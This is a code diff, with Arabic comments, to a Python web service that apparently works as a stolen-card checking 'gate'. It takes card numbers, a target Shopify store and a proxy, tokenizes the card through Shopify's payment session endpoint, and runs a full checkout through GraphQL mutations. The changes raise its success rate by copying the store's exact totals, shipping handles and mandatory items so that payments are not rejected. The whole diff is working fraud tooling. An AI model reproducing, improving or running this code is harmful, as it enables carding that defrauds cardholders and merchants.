@@ -21,7 +21,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python X-Ray Deep"):
+def safe_response(msg, raw_data, price, gate="Python Dynamic V1"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:250] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Declined" in msg or "Rejected" in msg) else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -114,29 +114,20 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 jwt_match = re.search(r'(eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})', html_chk)
                 if jwt_match: is_graphql = True; session_token = jwt_match.group(1)
 
-            if not is_graphql:
-                return JSONResponse(content=safe_response("Token Not Found", "Classic Token", price))
-
+            if not is_graphql: return JSONResponse(content=safe_response("Token Not Found", "Classic Token", price))
             if not checkout_token: checkout_token = "unknown"
 
             pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
             res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
             if res_pci.status_code != 200: res_pci = session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc_num, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
-            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:100], price))
+            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
             card_session_id = res_pci.json().get("id")
 
             flat_address = {
-                "address1": buyer["address1"],
-                "address2": "",
-                "city": buyer["city"],
-                "countryCode": buyer["country"],
-                "postalCode": buyer["zip"],
-                "firstName": buyer["first_name"],
-                "lastName": buyer["last_name"],
-                "zoneCode": buyer["province"],
-                "phone": buyer["phone"]
+                "address1": buyer["address1"], "address2": "", "city": buyer["city"], "countryCode": buyer["country"],
+                "postalCode": buyer["zip"], "firstName": buyer["first_name"], "lastName": buyer["last_name"],
+                "zoneCode": buyer["province"], "phone": buyer["phone"]
             }
-            
             partial_address = flat_address.copy()
             partial_address["oneTimeUse"] = False
 
@@ -147,7 +138,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             }
             merch_id = str(uuid.uuid4())
             
-            prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
+            prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken sellerProposal{total{value{amount currencyCode}}delivery{deliveryLines{selectedDeliveryStrategy{handle}}}merchandise{merchandiseLines{stableId quantity{items{value}}merchandise{...on ProductVariantMerchandise{variantId}}}}}}}}}}"""
             
             prop_vars = {
                 "sessionInput": {"sessionToken": session_token},
@@ -156,55 +147,78 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                         "destination": {"partialStreetAddress": partial_address},
                         "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {}},
                         "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
-                        "deliveryMethodTypes": ["SHIPPING"],
-                        "expectedTotalPrice": {"any": True},
-                        "destinationChanged": False
+                        "deliveryMethodTypes": ["SHIPPING"], "expectedTotalPrice": {"any": True}, "destinationChanged": False
                     }],
-                    "noDeliveryRequired": [],
-                    "useProgressiveRates": False,
-                    "prefetchShippingRatesStrategy": None,
-                    "supportsSplitShipping": True
+                    "noDeliveryRequired": [], "useProgressiveRates": False, "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True
                 },
-                "payment": {
-                    "totalAmount": {"any": True},
-                    "paymentLines": [],
-                    "billingAddress": {"streetAddress": flat_address}
-                },
+                "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": flat_address}},
                 "merchandise": {
                     "merchandiseLines": [{
                         "stableId": merch_id,
-                        "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
-                        "quantity": {"items": {"value": 1}},
-                        "expectedTotalPrice": {"any": True},
-                        "lineComponentsSource": None,
-                        "lineComponents": []
+                        "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}},
+                        "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}, "lineComponentsSource": None, "lineComponents": []
                     }]
                 },
-                "buyerIdentity": {
-                    "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
-                    "email": buyer["email"],
-                    "emailChanged": False,
-                    "phoneCountryCode": "US",
-                    "marketingConsent": [],
-                    "shopPayOptInPhone": None,
-                    "rememberMe": False
-                }
+                "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [], "shopPayOptInPhone": None, "rememberMe": False}
             }
             
             res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
             res_prop_json = res_prop.json()
             
-            # 1. منع الانهيار لو السيرفر ماردش ببيانات (حل مشكلة NoneType)
             data_obj = res_prop_json.get('data')
-            if not data_obj:
-                return JSONResponse(content=safe_response("Proposal Rejected by Store", res_prop.text[:250], price))
+            if not data_obj: return JSONResponse(content=safe_response("Proposal Rejected by Store", res_prop.text[:250], price))
                 
-            queue_token = data_obj.get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
+            negotiate_res = data_obj.get('session', {}).get('negotiate', {}).get('result', {})
+            queue_token = negotiate_res.get('queueToken')
             
-            if not queue_token: 
-                return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:250], price))
+            if not queue_token: return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:250], price))
             time.sleep(1)
 
+            # =========================================================
+            # الرادار الديناميكي (استخراج الداتا من شوبي فاي لعدم الرفض)
+            # =========================================================
+            seller_proposal = negotiate_res.get('sellerProposal', {})
+            
+            # 1. استخراج المبلغ الدقيق والعملة
+            exact_amount = {"any": True}
+            currency = "USD"
+            total_val = seller_proposal.get('total', {}).get('value')
+            if total_val and 'amount' in total_val and 'currencyCode' in total_val:
+                exact_amount = {"amount": total_val['amount'], "currencyCode": total_val['currencyCode']}
+                currency = total_val['currencyCode']
+                price = f"{total_val['amount']} {currency}" # تحديث السعر المعروض
+                
+            # 2. استخراج كود الشحن الإجباري
+            delivery_handle = "any"
+            d_lines = seller_proposal.get('delivery', {}).get('deliveryLines', [])
+            if d_lines:
+                handle = d_lines[0].get('selectedDeliveryStrategy', {}).get('handle')
+                if handle: delivery_handle = handle
+
+            # 3. استخراج كل المنتجات (بما فيها المنتجات الإجبارية زي التأمين)
+            seller_merch_lines = seller_proposal.get('merchandise', {}).get('merchandiseLines', [])
+            submit_merch_lines = []
+            target_lines = []
+            
+            for line in seller_merch_lines:
+                s_id = line.get('stableId')
+                qty = line.get('quantity', {}).get('items', {}).get('value', 1)
+                m_id = line.get('merchandise', {}).get('variantId')
+                if s_id and m_id:
+                    submit_merch_lines.append({
+                        "stableId": s_id,
+                        "merchandise": {"productVariantReference": {"id": m_id.replace("ProductVariant", "ProductVariantMerchandise"), "variantId": m_id}},
+                        "quantity": {"items": {"value": qty}}, "expectedTotalPrice": {"any": True}
+                    })
+                    target_lines.append({"stableId": s_id})
+            
+            if not submit_merch_lines: # بديل لو فشل الاستخراج
+                submit_merch_lines = prop_vars["merchandise"]["merchandiseLines"]
+                target_lines = [{"stableId": merch_id}]
+
+            # =========================================================
+            # بناء طلب الدفع النهائي المطابق 100%
+            # =========================================================
             sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
             sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
             
@@ -213,10 +227,20 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 "input": {
                     "sessionInput": {"sessionToken": session_token},
                     "queueToken": queue_token,
-                    "delivery": prop_vars["delivery"],
-                    "merchandise": prop_vars["merchandise"],
+                    "delivery": {
+                        "deliveryLines": [{
+                            "destination": {"streetAddress": flat_address},
+                            "targetMerchandiseLines": {"lines": target_lines},
+                            "deliveryMethodTypes": ["SHIPPING"],
+                            "destinationChanged": False,
+                            "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False}, "options": {}},
+                            "expectedTotalPrice": {"any": True}
+                        }],
+                        "supportsSplitShipping": True
+                    },
+                    "merchandise": {"merchandiseLines": submit_merch_lines},
                     "payment": {
-                        "totalAmount": {"any": True},
+                        "totalAmount": exact_amount, # المبلغ الدقيق
                         "paymentLines": [{
                             "paymentMethod": {
                                 "directPaymentMethod": {
@@ -225,11 +249,11 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                                     "billingAddress": {"streetAddress": flat_address}
                                 }
                             },
-                            "amount": {"any": True}
+                            "amount": exact_amount # المبلغ الدقيق
                         }],
                         "billingAddress": {"streetAddress": flat_address}
                     },
-                    "buyerIdentity": prop_vars["buyerIdentity"]
+                    "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}
                 }
             }
             
@@ -239,7 +263,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if sub_data.get('__typename') == 'SubmitRejected':
                 errs = sub_data.get('errors', [])
                 msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'Rejected'
-                # توسيع الرادار لكشف الخطأ الكامل
                 return JSONResponse(content=safe_response("Shopify System Rejected", res_sub.text[:250], price))
             
             receipt_id = sub_data.get('receipt', {}).get('id')
